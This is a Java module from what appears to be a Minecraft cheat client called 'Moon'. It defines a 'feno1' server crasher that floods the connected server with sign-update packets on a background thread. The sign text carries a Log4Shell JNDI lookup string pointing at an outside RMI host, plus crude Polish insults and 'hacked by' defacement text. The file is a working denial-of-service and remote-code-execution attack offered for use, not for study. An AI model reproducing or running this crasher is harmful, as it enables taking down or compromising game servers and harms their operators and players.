package Moon.methods.impl;

import Moon.helpers.ChatHelper;
import Moon.methods.Crash;
import Moon.methods.CrashInfo;
import Moon.mods.notifications.Notification;
import Moon.mods.notifications.NotificationManager;
import Moon.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.*;
import net.minecraft.util.BlockPos;

@CrashInfo(
        name = "feno1"
)
public class CrashFeno1 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Moon"), "Feno crasher started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));
        (new Thread(() -> {
            for (int i = 0; i < packets; ++i) {
                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C12PacketUpdateSign(new BlockPos(0, 0, 0), new String[] {
                        "{\"petya.exe\":\"${jndi:rmi://du.pa}\"}}",
                        "{\"pdw\"}",
                        "[\"jebac disa\"]",
                        "{\"hacked by twoja stara\"}"
                }));
            }
        })).start();


        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
